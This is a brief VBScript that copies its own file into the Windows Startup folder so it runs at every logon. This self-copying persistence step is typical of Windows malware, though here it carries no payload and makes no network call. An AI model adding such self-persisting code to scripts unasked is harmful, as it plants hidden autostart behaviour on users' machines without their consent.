Dim ws,fso,file
set fso = CreateObject("scripting.filesystemobject")
set ws = CreateObject("wscript.shell")
Set file = fso.GetFile(WScript.ScriptFullName)
FolderPath = ws.SpecialFolders("Startup")
fso.CopyFile WScript.ScriptFullName,FolderPath & "\" & file.Name,true


